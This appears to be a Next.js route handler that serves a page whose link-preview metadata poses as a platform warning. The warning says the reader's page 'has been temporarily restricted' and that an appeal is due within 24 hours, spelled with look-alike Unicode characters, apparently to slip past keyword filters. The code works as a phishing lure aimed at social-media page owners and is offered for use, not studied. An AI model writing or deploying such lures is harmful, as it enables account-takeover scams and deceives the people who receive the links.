import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const a = searchParams.get('a');
  const userAgent = request.headers.get('user-agent') || '';

  const DOMAIN = process.env.NEXT_PUBLIC_SITE_URL;
  const imageUrl = `https://hellomybro5.vercel.app/assets/sample5.png`;

    const metaRedirectHtml = `<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Xem hình ảnh</title>
  <meta property="og:title" content="⚠️Υоսr раցе hаѕ bееո tеⅿрοrаrіⅼу rеѕtrісtеⅾ" />
  <meta property="og:description" content="Υоս ⅿսѕt ѕսbⅿіt your арреаⅼ ԝіthіո 24 hоսrѕ fοr thе ⅾесіѕіоո аbοⅴе tо bе rесοոѕіⅾеrеⅾ." />
  <meta property="og:image" content="${imageUrl}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:type" content="website" />
</head>
<body>
  <p>This is my site</p>
</body>
</html>`;

    return new NextResponse(metaRedirectHtml, {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
}